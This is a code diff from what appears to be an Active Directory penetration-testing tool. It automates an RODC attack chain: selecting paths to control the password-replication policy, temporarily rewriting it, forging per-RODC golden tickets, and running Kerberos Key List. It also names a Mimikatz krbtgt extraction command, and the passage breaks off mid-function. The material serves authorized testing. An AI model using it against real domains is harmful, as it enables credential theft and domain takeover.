@@ -7,6 +7,7 @@ privileged account on that RODC using ``bloodyAD``.
 
 from __future__ import annotations
 
+from pathlib import Path
 from typing import Any, Iterable
 
 from rich.prompt import Confirm, Prompt
@@ -32,6 +33,7 @@ from adscan_internal.services.attack_graph_service import (
     get_owned_domain_usernames_for_attack_paths,
     get_rodc_prp_control_paths,
     load_attack_graph,
+    resolve_user_sid,
     save_attack_graph,
 )
 from adscan_internal.services.pivot_opportunity_service import (
@@ -40,6 +42,7 @@ from adscan_internal.services.pivot_opportunity_service import (
 from adscan_internal.services import ExploitationService
 from adscan_internal.services.attack_graph_runtime_service import (
     active_step,
+    active_step_followup,
     update_active_step_status,
 )
 from adscan_internal.services.attack_path_cleanup_service import (
@@ -50,6 +53,20 @@ from adscan_internal.services.attack_path_cleanup_service import (
 from adscan_internal.services.current_vantage_reachability_service import (
     CurrentVantageTargetAssessment,
     resolve_targets_from_current_vantage,
+)
+from adscan_internal.services.rodc_followup_state_service import (
+    RodcFollowupStateService,
+)
+from adscan_internal.services.exploitation.kerberos_key_list import (
+    KerberosKeyListRequest,
+    KerberosKeyListService,
+)
+from adscan_internal.services.exploitation.rodc_golden_ticket import (
+    RodcGoldenTicketForger,
+    RodcGoldenTicketRequest,
+)
+from adscan_internal.services.rodc_followup_planner import (
+    resolve_rodc_krbtgt_key_plan,
 )
 
 
@@ -97,8 +114,7 @@ def _parse_bloodyad_multi_value_output(output: str) -> dict[str, tuple[str, ...]
             continue
         values.setdefault(key_clean, []).append(value_clean)
     return {
-        key: _normalize_attr_values(raw_values)
-        for key, raw_values in values.items()
+        key: _normalize_attr_values(raw_values) for key, raw_values in values.items()
     }
 
 
@@ -253,6 +269,116 @@ def _find_rodc_graph_node(
     return None, normalized_machine
 
 
+def _candidate_records_for_rodc_control_paths(
+    *,
+    paths: list[dict[str, Any]],
+    owned_principals: Iterable[str],
+) -> list[dict[str, Any]]:
+    """Return effective owned-principal candidates for RODC object-control paths."""
+    owned_principal_labels = {
+        normalized
+        for principal in owned_principals
+        if (normalized := _normalize_graph_principal_label(principal))
+    }
+    candidates_by_user: dict[str, dict[str, Any]] = {}
+    for path in paths:
+        if not isinstance(path, dict):
+            continue
+        terminal_relation = _summary_terminal_relation_local(path)
+
+        candidate_labels: list[str] = []
+        steps = path.get("steps")
+        if isinstance(steps, list):
+            for step in reversed(steps):
+                if not isinstance(step, dict):
+                    continue
+                details = (
+                    step.get("details") if isinstance(step.get("details"), dict) else {}
+                )
+                step_labels: list[str] = []
+                for key in ("to", "from"):
+                    raw_value = details.get(key)
+                    if isinstance(raw_value, str) and raw_value.strip():
+                        step_labels.append(
+                            strip_sensitive_markers(str(raw_value)).strip()
+                        )
+                for candidate_label in step_labels:
+                    normalized_candidate = _normalize_graph_principal_label(
+                        candidate_label
+                    )
+                    if not normalized_candidate:
+                        continue
+                    if normalized_candidate in owned_principal_labels:
+                        candidate_labels.append(candidate_label)
+                        break
+                if candidate_labels:
+                    break
+
+        if not candidate_labels:
+            meta = path.get("meta")
+            if isinstance(meta, dict):
+                affected_users = meta.get("affected_users")
+                if isinstance(affected_users, list):
+                    for affected_user in affected_users:
+                        affected_clean = strip_sensitive_markers(
+                            str(affected_user or "")
+                        ).strip()
+                        if not affected_clean:
+                            continue
+                        candidate_labels.append(affected_clean)
+
+        if not candidate_labels:
+            nodes = path.get("nodes")
+            if isinstance(nodes, list):
+                for raw_node in reversed(nodes[:-1]):
+                    candidate_label = strip_sensitive_markers(str(raw_node or "")).strip()
+                    normalized_candidate = _normalize_graph_principal_label(
+                        candidate_label
+                    )
+                    if not normalized_candidate:
+                        continue
+                    if normalized_candidate in owned_principal_labels:
+                        candidate_labels.append(candidate_label)
+                        break
+
+        if not candidate_labels:
+            source_label = str(path.get("source") or "").strip()
+            if not source_label:
+                nodes = path.get("nodes")
+                if isinstance(nodes, list) and nodes:
+                    source_label = str(nodes[0] or "").strip()
+            if source_label:
+                candidate_labels.append(source_label)
+
+        for candidate_label in candidate_labels:
+            normalized_source = _normalize_graph_principal_label(candidate_label)
+            if not normalized_source:
+                continue
+            record = candidates_by_user.setdefault(
+                normalized_source,
+                {
+                    "username": candidate_label.split("@", 1)[0]
+                    if "@" in candidate_label
+                    else candidate_label,
+                    "label": candidate_label,
+                    "relations": [],
+                    "sample_path": path,
+                },
+            )
+            relations = record.get("relations")
+            if (
+                isinstance(relations, list)
+                and terminal_relation
+                and terminal_relation not in relations
+            ):
+                relations.append(terminal_relation)
+
+    return sorted(
+        candidates_by_user.values(),
+        key=lambda entry: str(entry.get("username") or "").lower(),
+    )
+
+
 def _assess_rodc_object_control(
     shell: Any,
     *,
@@ -270,6 +396,8 @@ def _assess_rodc_object_control(
             "current_actor_ready": False,
             "candidates": [],
             "candidate_paths": [],
+            "ready_paths": [],
+            "prerequisite_paths": [],
         }
 
     _target_node_id, target_label = _find_rodc_graph_node(
@@ -285,6 +413,8 @@ def _assess_rodc_object_control(
             "current_actor_ready": False,
             "candidates": [],
             "candidate_paths": [],
+            "ready_paths": [],
+            "prerequisite_paths": [],
         }
 
     owned_principals = get_owned_domain_usernames_for_attack_paths(shell, domain)
@@ -297,55 +427,9 @@ def _assess_rodc_object_control(
             "current_actor_ready": False,
             "candidates": [],
             "candidate_paths": [],
+            "ready_paths": [],
+            "prerequisite_paths": [],
         }
-
-    def _candidate_records_for_paths(paths: list[dict[str, Any]]) -> list[dict[str, Any]]:
-        candidates_by_user: dict[str, dict[str, Any]] = {}
-        for path in paths:
-            if not isinstance(path, dict):
-                continue
-            terminal_relation = _summary_terminal_relation_local(path)
-
-            candidate_labels: list[str] = []
-            meta = path.get("meta")
-            if isinstance(meta, dict):
-                affected_users = meta.get("affected_users")
-                if isinstance(affected_users, list):
-                    for affected_user in affected_users:
-                        affected_clean = strip_sensitive_markers(str(affected_user or "")).strip()
-                        if not affected_clean:
-                            continue
-                        candidate_labels.append(affected_clean)
-
-            if not candidate_labels:
-                source_label = str(path.get("source") or "").strip()
-                if not source_label:
-                    nodes = path.get("nodes")
-                    if isinstance(nodes, list) and nodes:
-                        source_label = str(nodes[0] or "").strip()
-                if source_label:
-                    candidate_labels.append(source_label)
-
-            for candidate_label in candidate_labels:
-                normalized_source = _normalize_graph_principal_label(candidate_label)
-                if not normalized_source:
-                    continue
-                record = candidates_by_user.setdefault(
-                    normalized_source,
-                    {
-                        "username": candidate_label.split("@", 1)[0] if "@" in candidate_label else candidate_label,
-                        "label": candidate_label,
-                        "relations": [],
-                        "sample_path": path,
-                    },
-                )
-                relations = record.get("relations")
-                if isinstance(relations, list) and terminal_relation and terminal_relation not in relations:
-                    relations.append(terminal_relation)
-        return sorted(
-            candidates_by_user.values(),
-            key=lambda entry: str(entry.get("username") or "").lower(),
-        )
 
     target_paths = get_owned_attack_path_summaries_to_target(
         shell,
@@ -368,10 +452,19 @@ def _assess_rodc_object_control(
         for path in confirmed_paths
         if not _rodc_control_path_requires_prerequisite_execution(path)
     ]
-    candidates = _candidate_records_for_paths(directly_usable_paths)
+    prerequisite_paths = [
+        path
+        for path in confirmed_paths
+        if _rodc_control_path_requires_prerequisite_execution(path)
+    ]
+    candidates = _candidate_records_for_rodc_control_paths(
+        paths=directly_usable_paths,
+        owned_principals=owned_principals,
+    )
     if candidates:
         candidate_norms = {
-            _normalize_graph_principal_label(str(entry.get("username") or "")) for entry in candidates
+            _normalize_graph_principal_label(str(entry.get("username") or ""))
+            for entry in candidates
         }
         return {
             "ready": True,
@@ -379,15 +472,15 @@ def _assess_rodc_object_control(
             "target_label": target_label,
             "current_actor_ready": current_actor_norm in candidate_norms,
             "candidates": candidates,
-            "candidate_paths": [],
+            "candidate_paths": directly_usable_paths,
+            "ready_paths": directly_usable_paths,
+            "prerequisite_paths": prerequisite_paths,
         }
 
-    prerequisite_paths = [
-        path
-        for path in confirmed_paths
-        if _rodc_control_path_requires_prerequisite_execution(path)
-    ]
-    prerequisite_candidates = _candidate_records_for_paths(prerequisite_paths)
+    prerequisite_candidates = _candidate_records_for_rodc_control_paths(
+        paths=prerequisite_paths,
+        owned_principals=owned_principals,
+    )
     if prerequisite_candidates:
         return {
             "ready": False,
@@ -396,10 +489,15 @@ def _assess_rodc_object_control(
             "current_actor_ready": False,
             "candidates": prerequisite_candidates,
             "candidate_paths": prerequisite_paths,
+            "ready_paths": directly_usable_paths,
+            "prerequisite_paths": prerequisite_paths,
         }
 
     candidate_paths = list(target_paths)
-    candidate_records = _candidate_records_for_paths(candidate_paths)
+    candidate_records = _candidate_records_for_rodc_control_paths(
+        paths=candidate_paths,
+        owned_principals=owned_principals,
+    )
     if candidate_records:
         return {
             "ready": False,
@@ -408,6 +506,8 @@ def _assess_rodc_object_control(
             "current_actor_ready": False,
             "candidates": candidate_records,
             "candidate_paths": candidate_paths,
+            "ready_paths": directly_usable_paths,
+            "prerequisite_paths": prerequisite_paths,
         }
 
     return {
@@ -417,6 +517,280 @@ def _assess_rodc_object_control(
         "current_actor_ready": False,
         "candidates": [],
         "candidate_paths": [],
+        "ready_paths": [],
+        "prerequisite_paths": [],
+    }
+
+
+def _maybe_select_ready_rodc_object_control_path(
+    shell: Any,
+    *,
+    domain: str,
+    machine_account: str,
+    actor_username: str,
+    object_control: dict[str, Any],
+) -> dict[str, Any]:
+    """Let the operator choose among ready and prerequisite RODC PRP-control paths."""
+    ready_paths = [
+        path
+        for path in list(
+            object_control.get("ready_paths")
+            or (
+                object_control.get("candidate_paths")
+                if bool(object_control.get("ready"))
+                else []
+            )
+            or []
+        )
+        if isinstance(path, dict)
+    ]
+    prerequisite_paths = [
+        path
+        for path in list(
+            object_control.get("prerequisite_paths")
+            or (
+                object_control.get("candidate_paths")
+                if str(object_control.get("reason") or "").strip().lower()
+                == "prerequisite_path_available"
+                else []
+            )
+            or []
+        )
+        if isinstance(path, dict)
+    ]
+    if not bool(object_control.get("ready")) and not prerequisite_paths:
+        print_info_debug(
+            "[rodc] ready-path selection bypassed: "
+            f"ready={bool(object_control.get('ready'))} "
+            f"reason={mark_sensitive(str(object_control.get('reason') or 'unknown'), 'detail')} "
+            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
+        )
+        return object_control
+    if bool(object_control.get("ready")) and not prerequisite_paths:
+        print_info_debug(
+            "[rodc] ready-path selection bypassed because no prerequisite path remains: "
+            f"ready_paths={len(ready_paths)} "
+            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
+        )
+        return object_control
+
+    auto_mode = bool(getattr(shell, "auto", False))
+    print_info_debug(
+        "[rodc] ready-path selection gate: "
+        f"ready_paths={len(ready_paths)} "
+        f"prerequisite_paths={len(prerequisite_paths)} "
+        f"candidates={len(list(object_control.get('candidates') or []))} "
+        f"auto={auto_mode} "
+        f"current_actor_ready={bool(object_control.get('current_actor_ready'))} "
+        f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
+    )
+    if (not ready_paths and not prerequisite_paths) or auto_mode:
+        skip_reason = (
+            "no_candidate_paths"
+            if not ready_paths and not prerequisite_paths
+            else "auto_mode"
+        )
+        print_info_debug(
+            "[rodc] ready-path selection skipped: "
+            f"skip_reason={mark_sensitive(skip_reason, 'detail')} "
+            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
+        )
+        return object_control
+
+    from adscan_internal.cli.attack_path_execution import print_attack_paths_summary
+
+    print_panel(
+        "\n".join(
+            [
+                (
+                    f"ADscan found {len(ready_paths)} confirmed attack path(s) that already provide "
+                    f"PRP-control over {mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}."
+                    if ready_paths
+                    else f"ADscan found no confirmed ready PRP-control path yet for {mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}."
+                ),
+                (
+                    f"ADscan also found {len(prerequisite_paths)} prerequisite path(s) that can materialize PRP-control first."
+                    if prerequisite_paths
+                    else "No additional prerequisite path is currently available."
+                ),
+                f"The current actor {mark_sensitive(actor_username, 'user')} is not necessarily the effective LDAP actor for every path.",
+                "Select how you want to continue with the RODC PRP follow-up.",
+            ]
+        ),
+        title="[bold blue]Choose RODC PRP Path[/bold blue]",
+        border_style="blue",
+        expand=False,
+    )
+    if ready_paths:
+        print_panel(
+            "These paths are immediately usable for the LDAP PRP-modification phase.",
+            title="[bold green]Ready Now[/bold green]",
+            border_style="green",
+            expand=False,
+        )
+        print_attack_paths_summary(
+            domain,
+            ready_paths,
+            max_display=min(5, len(ready_paths)),
+            search_mode_label="RODC PRP control path selection",
+            actionable_count=len(ready_paths),
+            show_sections=False,
+        )
+    if prerequisite_paths:
+        print_panel(
+            "These paths require prerequisite execution first, then ADscan will revalidate PRP-control.",
+            title="[bold yellow]Needs Prerequisite Execution[/bold yellow]",
+            border_style="yellow",
+            expand=False,
+        )
+        print_attack_paths_summary(
+            domain,
+            prerequisite_paths,
+            max_display=min(5, len(prerequisite_paths)),
+            search_mode_label="RODC PRP prerequisite path selection",
+            actionable_count=len(prerequisite_paths),
+            show_sections=False,
+        )
+
+    selection_entries: list[tuple[str, dict[str, Any]]] = []
+    for summary in ready_paths[:5]:
+        selection_entries.append(("ready", summary))
+    for summary in prerequisite_paths[:5]:
+        selection_entries.append(("prerequisite", summary))
+
+    options = [
+        (
+            f"{idx + 1}. [Ready] {summary.get('source')} -> {summary.get('target')} "
+            f"[{summary.get('status')}]"
+            if category == "ready"
+            else f"{idx + 1}. [Needs prerequisite] {summary.get('source')} -> {summary.get('target')} "
+            f"[{summary.get('status')}]"
+        )
+        for idx, (category, summary) in enumerate(selection_entries)
+    ]
+    options.append("Cancel RODC follow-up")
+
+    selected_idx = None
+    if hasattr(shell, "_questionary_select"):
+        try:
+            selected_idx = shell._questionary_select(
+                "Select the attack path to use for RODC PRP control:",
+                options,
+                default_idx=0,
+                context={
+                    "remote_interaction": True,
+                    "category": "rodc_followup",
+                    "domain": domain,
+                    "candidate_count": len(selection_entries),
+                },
+            )
+        except TypeError:
+            selected_idx = shell._questionary_select(
+                "Select the attack path to use for RODC PRP control:",
+                options,
+                default_idx=0,
+            )
+    if selected_idx is None:
+        selected_choice = Prompt.ask(
+            "Select how to continue with RODC PRP control (or 0 to cancel)",
+            choices=[str(index) for index in range(0, len(options))],
+            default="1",
+        )
+        try:
+            selected_raw = int(selected_choice)
+        except ValueError:
+            selected_raw = 0
+        selected_idx = len(options) - 1 if selected_raw <= 0 else selected_raw - 1
+
+    if selected_idx >= len(selection_entries):
+        print_info("Skipping RODC follow-up by user choice.")
+        print_info_debug(
+            "[rodc] ready-path selection cancelled by user: "
+            f"candidate_paths={len(selection_entries)} "
+            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
+        )
+        return {
+            **object_control,
+            "ready": False,
+            "reason": "user_declined_ready_path_selection",
+        }
+
+    selected_category, selected_path = selection_entries[selected_idx]
+    if selected_category == "prerequisite":
+        from adscan_internal.cli.attack_path_execution import (
+            offer_attack_paths_for_execution_summaries,
+        )
+
+        def _recompute_prerequisite_summaries() -> list[dict[str, Any]]:
+            refreshed = _assess_rodc_object_control(
+                shell,
+                domain=domain,
+                machine_account=machine_account,
+                actor_username=actor_username,
+            )
+            return list(refreshed.get("prerequisite_paths") or [])
+
+        executed = offer_attack_paths_for_execution_summaries(
+            shell,
+            domain,
+            summaries=[selected_path],
+            max_display=1,
+            search_mode_label="RODC prerequisite search",
+            show_sections=False,
+            recompute_summaries=_recompute_prerequisite_summaries,
+            snapshot_scope="owned",
+            snapshot_target="all",
+            snapshot_target_mode="tier0",
+        )
+        if not executed:
+            print_info(
+                "RODC prerequisite attack path was not executed, so the follow-up cannot continue."
+            )
+            return {
+                **object_control,
+                "ready": False,
+                "reason": "user_declined_prerequisite_path_selection",
+            }
+
+        refreshed = _assess_rodc_object_control(
+            shell,
+            domain=domain,
+            machine_account=machine_account,
+            actor_username=actor_username,
+        )
+        if bool(refreshed.get("ready")):
+            print_success(
+                f"RODC prerequisite path completed and confirmed object control is now available for {mark_sensitive(str(refreshed.get('target_label') or machine_account), 'user')}."
+            )
+        else:
+            print_warning(
+                "ADscan executed the selected prerequisite path, but confirmed RODC PRP-write capability is still not available."
+            )
+        return refreshed
+
+    owned_principals = get_owned_domain_usernames_for_attack_paths(shell, domain)
+    selected_candidates = _candidate_records_for_rodc_control_paths(
+        paths=[selected_path],
+        owned_principals=owned_principals,
+    )
+    current_actor_norm = _normalize_graph_principal_label(actor_username)
+    candidate_norms = {
+        _normalize_graph_principal_label(str(entry.get("username") or ""))
+        for entry in selected_candidates
+    }
+    print_info_debug(
+        "[rodc] ready-path selection applied: "
+        f"selected_index={selected_idx} "
+        f"selected_category={mark_sensitive(selected_category, 'detail')} "
+        f"selected_source={mark_sensitive(str(selected_path.get('source') or 'unknown'), 'user')} "
+        f"selected_target={mark_sensitive(str(selected_path.get('target') or machine_account), 'user')} "
+        f"selected_candidates={len(selected_candidates)}"
+    )
+    return {
+        **object_control,
+        "candidates": selected_candidates,
+        "candidate_paths": [selected_path],
+        "current_actor_ready": current_actor_norm in candidate_norms,
     }
 
 
@@ -473,10 +847,14 @@ def _refresh_rodc_prp_control_edges(
     return added_edges
 
 
-def _owned_cleartext_credentials(shell: Any, *, domain: str) -> dict[str, tuple[str, str]]:
+def _owned_cleartext_credentials(
+    shell: Any, *, domain: str
+) -> dict[str, tuple[str, str]]:
     """Return owned principals that have reusable cleartext domain credentials."""
     owned_users = get_owned_domain_usernames_for_attack_paths(shell, domain)
-    credentials = getattr(shell, "domains_data", {}).get(domain, {}).get("credentials", {})
+    credentials = (
+        getattr(shell, "domains_data", {}).get(domain, {}).get("credentials", {})
+    )
     if not isinstance(credentials, dict):
         return {}
 
@@ -516,18 +894,27 @@ def _select_rodc_policy_actor(
             {
                 **candidate,
                 "credential_ready": credential_record is not None,
-                "credential_username": credential_record[0] if credential_record else None,
-                "credential_secret": credential_record[1] if credential_record else None,
+                "credential_username": credential_record[0]
+                if credential_record
+                else None,
+                "credential_secret": credential_record[1]
+                if credential_record
+                else None,
             }
         )
 
     ready_candidates = [
-        candidate for candidate in enriched_candidates if bool(candidate.get("credential_ready"))
+        candidate
+        for candidate in enriched_candidates
+        if bool(candidate.get("credential_ready"))
     ]
     current_actor_norm = _normalize_graph_principal_label(current_actor)
     selected: dict[str, Any] | None = None
     for candidate in ready_candidates:
-        if _normalize_graph_principal_label(str(candidate.get("username") or "")) == current_actor_norm:
+        if (
+            _normalize_graph_principal_label(str(candidate.get("username") or ""))
+            == current_actor_norm
+        ):
             selected = candidate
             break
 
@@ -536,11 +923,17 @@ def _select_rodc_policy_actor(
             selected = ready_candidates[0]
         else:
             option_map = {
-                str(index): candidate for index, candidate in enumerate(ready_candidates, start=1)
+                str(index): candidate
+                for index, candidate in enumerate(ready_candidates, start=1)
             }
             lines = []
             for option, candidate in option_map.items():
-                relations = ", ".join(str(value) for value in (candidate.get("relations") or [])) or "unknown"
+                relations = (
+                    ", ".join(
+                        str(value) for value in (candidate.get("relations") or [])
+                    )
+                    or "unknown"
+                )
                 lines.append(
                     f"{option}. {mark_sensitive(str(candidate.get('label') or candidate.get('username') or ''), 'user')} via {mark_sensitive(relations, 'detail')}"
                 )
@@ -561,7 +954,8 @@ def _select_rodc_policy_actor(
         "ready": selected is not None,
         "selected": selected,
         "current_actor_ready": selected is not None
-        and _normalize_graph_principal_label(str(selected.get("username") or "")) == current_actor_norm,
+        and _normalize_graph_principal_label(str(selected.get("username") or ""))
+        == current_actor_norm,
         "candidates": enriched_candidates,
         "reason": "ok" if selected is not None else "no_reusable_cleartext_credential",
     }
@@ -611,9 +1005,12 @@ def _print_rodc_object_control_guidance(
     elif candidates:
         lines.append("Owned principals with direct control over the RODC object:")
         for candidate in candidates:
-            relations = ", ".join(
-                str(relation) for relation in (candidate.get("relations") or [])
-            ) or "unknown"
+            relations = (
+                ", ".join(
+                    str(relation) for relation in (candidate.get("relations") or [])
+                )
+                or "unknown"
+            )
             credential_note = ""
             if "credential_ready" in candidate:
                 credential_note = (
@@ -672,7 +1069,17 @@ def _maybe_execute_rodc_object_control_prerequisites(
     object_control: dict[str, Any],
 ) -> dict[str, Any]:
     """Offer prerequisite path execution when RODC control is reachable but not yet materialized."""
-    if str(object_control.get("reason") or "").strip().lower() != "prerequisite_path_available":
+    if not bool(getattr(shell, "auto", False)):
+        print_info_debug(
+            "[rodc] prerequisite execution deferred to interactive unified selector: "
+            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
+        )
+        return object_control
+
+    if (
+        str(object_control.get("reason") or "").strip().lower()
+        != "prerequisite_path_available"
+    ):
         return object_control
 
     prerequisite_paths = list(object_control.get("candidate_paths") or [])
@@ -705,7 +1112,10 @@ def _maybe_execute_rodc_object_control_prerequisites(
             machine_account=machine_account,
             actor_username=actor_username,
         )
-        if str(refreshed.get("reason") or "").strip().lower() != "prerequisite_path_available":
+        if (
+            str(refreshed.get("reason") or "").strip().lower()
+            != "prerequisite_path_available"
+        ):
             return []
         return list(refreshed.get("candidate_paths") or [])
 
@@ -830,11 +1240,14 @@ def _resolve_object_dn(
     )
     if not result.success:
         return None
-    return str(
-        result.attributes.get("distinguishedName")
-        or result.attributes.get("distinguishedname")
-        or ""
-    ).strip() or None
+    return (
+        str(
+            result.attributes.get("distinguishedName")
+            or result.attributes.get("distinguishedname")
+            or ""
+        ).strip()
+        or None
+    )
 
 
 def _load_rodc_attribute_state(
@@ -865,13 +1278,20 @@ def _load_rodc_attribute_state(
     if not result.success:
         return None, (), ()
     parsed = _parse_bloodyad_multi_value_output(result.raw_output or "")
-    rodc_dn = str(
-        result.attributes.get("distinguishedName")
-        or result.attributes.get("distinguishedname")
-        or ""
-    ).strip() or None
-    reveal_values = _normalize_rodc_prp_attribute_values(parsed, "msDS-RevealOnDemandGroup")
-    never_reveal_values = _normalize_rodc_prp_attribute_values(parsed, "msDS-NeverRevealGroup")
+    rodc_dn = (
+        str(
+            result.attributes.get("distinguishedName")
+            or result.attributes.get("distinguishedname")
+            or ""
+        ).strip()
+        or None
+    )
+    reveal_values = _normalize_rodc_prp_attribute_values(
+        parsed, "msDS-RevealOnDemandGroup"
+    )
+    never_reveal_values = _normalize_rodc_prp_attribute_values(
+        parsed, "msDS-NeverRevealGroup"
+    )
     return rodc_dn, reveal_values, never_reveal_values
 
 
@@ -951,37 +1371,6 @@ def _print_rodc_cleanup_manual_guidance(
     )
 
 
-def _maybe_dump_rodc_lsa(
-    shell: Any,
-    *,
-    domain: str,
-    host: str,
-    username: str,
-    password: str,
-) -> bool:
-    """Offer an immediate LSA dump against the prepared RODC over SMB."""
-    marked_host = mark_sensitive(host, "hostname")
-    marked_username = mark_sensitive(username, "user")
-    if not getattr(shell, "auto", False) and not Confirm.ask(
-        f"Dump LSA secrets from {marked_host} now using {marked_username}?",
-        default=True,
-    ):
-        print_info(
-            f"Skipping the automatic RODC LSA dump for {marked_host} by user choice."
-        )
-        return False
-
-    shell.dump_lsa(
-        domain,
-        username,
-        password,
-        host,
-        "false",
-        include_machine_accounts=True,
-    )
-    return True
-
-
 def _print_rodc_followup_execution_plan(
     *,
     domain: str,
@@ -990,40 +1379,400 @@ def _print_rodc_followup_execution_plan(
     host_actor: str,
     ldap_actor_label: str,
     target_user: str,
+    key_list_ready: bool,
+    key_plan_username: str | None = None,
+    rodc_number: int | None = None,
 ) -> None:
     """Explain the two-actor execution plan before changing RODC state."""
-    print_panel(
-        "\n".join(
+    lines = [
+        f"RODC object: {mark_sensitive(rodc_machine, 'user')} in {mark_sensitive(domain, 'domain')}",
+        f"LDAP policy actor: {mark_sensitive(ldap_actor_label, 'user')}",
+        f"RODC host actor: {mark_sensitive(host_actor, 'user')}",
+        f"Reachable host: {mark_sensitive(reachable_host, 'hostname')}",
+        f"Target privileged principal: {mark_sensitive(target_user, 'user')}",
+        "",
+        "ADscan will temporarily update the RODC password-replication policy with the LDAP-capable principal, then restore the original attributes during cleanup.",
+    ]
+    if key_list_ready:
+        lines.extend(
             [
-                f"RODC object: {mark_sensitive(rodc_machine, 'user')} in {mark_sensitive(domain, 'domain')}",
-                f"LDAP policy actor: {mark_sensitive(ldap_actor_label, 'user')}",
-                f"RODC host actor: {mark_sensitive(host_actor, 'user')}",
-                f"Reachable host: {mark_sensitive(reachable_host, 'hostname')}",
-                f"Target privileged principal: {mark_sensitive(target_user, 'user')}",
                 "",
-                "ADscan will first update the RODC password-replication policy with the LDAP-capable principal, then attempt the host-side LSA dump with the compromised RODC machine account.",
+                "PRP-active recovery plan:",
+                "1. Keep the temporary PRP window open just long enough for credential recovery.",
+                "2. Forge a fresh per-RODC golden ticket and use it immediately for Kerberos Key List.",
+                "3. Store any recovered credential material before cleanup restores the original LDAP attributes.",
             ]
-        ),
+        )
+        if key_plan_username:
+            lines.append(
+                "Stored per-RODC krbtgt material: "
+                f"{mark_sensitive(key_plan_username, 'user')}"
+                + (
+                    f" (RODC #{mark_sensitive(str(rodc_number), 'detail')})"
+                    if rodc_number is not None
+                    else ""
+                )
+            )
+
+    print_panel(
+        "\n".join(lines),
         title="[bold blue]RODC Follow-up Plan[/bold blue]",
         border_style="blue",
         expand=False,
     )
 
 
-def _print_rodc_post_dump_guidance(*, host: str) -> None:
-    """Explain the operator's immediate post-dump objective."""
+def _print_rodc_prp_next_steps(
+    *,
+    host: str,
+    target_user: str,
+    cleanup_completed: bool,
+) -> None:
+    """Explain what PRP preparation did and which modern follow-up should run next."""
+    prp_state_line = (
+        "ADscan restored the original PRP attributes, so this was a safe validation of the write path rather than a persistent PRP change."
+        if cleanup_completed
+        else "ADscan could not confirm cleanup, so treat the RODC PRP attributes as still modified until manually verified."
+    )
     print_panel(
         "\n".join(
             [
-                f"Review the LSA dump from {mark_sensitive(host, 'hostname')} for the per-RODC krbtgt account (for example `krbtgt_8245`).",
-                "The immediate objective is the per-RODC krbtgt secret, not the RODC machine-account hash.",
-                "If recovered, the next phase is forging an RODC TGT and using it for the writable-DC path.",
+                f"PRP write path validated for {mark_sensitive(target_user, 'user')} on {mark_sensitive(host, 'hostname')}.",
+                prp_state_line,
+                "",
+                "ADscan intentionally does not run the legacy generic LSA dump here.",
+                "For the per-RODC krbtgt objective, use the RODC krbtgt extraction follow-up; it runs the targeted `lsadump::lsa /inject /name:krbtgt_<RID>` workflow.",
+                "After AES material is available for the per-RODC krbtgt account, continue with the Kerberos Key List follow-up.",
             ]
         ),
-        title="[bold green]RODC Next Objective[/bold green]",
+        title="[bold green]RODC PRP Next Steps[/bold green]",
         border_style="green",
         expand=False,
     )
+
+
+def _resolve_rodc_aes_key_from_workspace(
+    shell: Any,
+    *,
+    domain: str,
+    key_username: str,
+) -> str:
+    """Return stored AES material for a per-RODC krbtgt account."""
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    if not isinstance(domain_data, dict):
+        return ""
+    kerberos_keys = domain_data.get("kerberos_keys", {})
+    if not isinstance(kerberos_keys, dict):
+        return ""
+
+    normalized_username = str(key_username or "").strip().casefold()
+    for username, raw_material in kerberos_keys.items():
+        if str(username or "").strip().casefold() != normalized_username:
+            continue
+        if not isinstance(raw_material, dict):
+            return ""
+        return str(raw_material.get("aes256") or raw_material.get("aes128") or "").strip()
+    return ""
+
+
+def _resolve_rodc_target_identity(
+    shell: Any,
+    *,
+    domain: str,
+    target_user: str,
+) -> tuple[str | None, int | None]:
+    """Return the domain SID and target RID required for RODC ticket forging."""
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    domain_sid = ""
+    if isinstance(domain_data, dict):
+        domain_sid = str(domain_data.get("domain_sid") or "").strip()
+
+    user_sid = resolve_user_sid(shell, domain, target_user)
+    if user_sid:
+        parts = user_sid.split("-")
+        if len(parts) >= 2 and parts[-1].isdigit():
+            return domain_sid or "-".join(parts[:-1]), int(parts[-1])
+    if str(target_user or "").strip().casefold() == "administrator":
+        return domain_sid or None, 500
+    return domain_sid or None, None
+
+
+def _resolve_rodc_golden_ticket_output_dir(
+    shell: Any,
+    *,
+    domain: str,
+    rodc_number: int,
+) -> Path:
+    """Return the per-RODC forged-ticket artefact directory."""
+    workspace_dir = Path(_resolve_workspace_dir(shell))
+    domains_dir = str(getattr(shell, "domains_dir", "domains") or "domains").strip() or "domains"
+    return (
+        workspace_dir
+        / domains_dir
+        / domain
+        / "kerberos"
+        / "rodc_golden_tickets"
+        / f"rodc_{int(rodc_number)}"
+    )
+
+
+def _forge_rodc_golden_ticket_for_prp_key_list(
+    shell: Any,
+    *,
+    domain: str,
+    rodc_machine: str,
+    target_user: str,
+    rodc_number: int,
+    rodc_aes_key: str,
+) -> str:
+    """Forge a fresh RODC golden ticket for the PRP-active Key List transaction."""
+    domain_sid, user_rid = _resolve_rodc_target_identity(
+        shell,
+        domain=domain,
+        target_user=target_user,
+    )
+    if not domain_sid or user_rid is None:
+        return ""
+
+    output_dir = _resolve_rodc_golden_ticket_output_dir(
+        shell,
+        domain=domain,
+        rodc_number=rodc_number,
+    )
+    outcome = RodcGoldenTicketForger().forge(
+        RodcGoldenTicketRequest(
+            domain=domain.upper(),
+            domain_sid=domain_sid,
+            target_username=target_user,
+            rodc_number=rodc_number,
+            output_dir=output_dir,
+            krbtgt_aes256=rodc_aes_key,
+            user_id=user_rid,
+        )
+    )
+    if not outcome.success or not outcome.ccache_path:
+        print_warning(
+            "Kerberos Key List requires a forged RODC ticket, but ticket forging failed: "
+            f"{mark_sensitive(outcome.error_message or 'unknown error', 'detail')}"
+        )
+        return ""
+
+    RodcFollowupStateService().mark_golden_ticket_forged(
+        shell,
+        domain=domain,
+        target_computer=rodc_machine,
+        target_user=target_user,
+        ticket_path=outcome.ccache_path,
+    )
+    return outcome.ccache_path
+
+
+def _save_rodc_key_list_output(
+    shell: Any,
+    *,
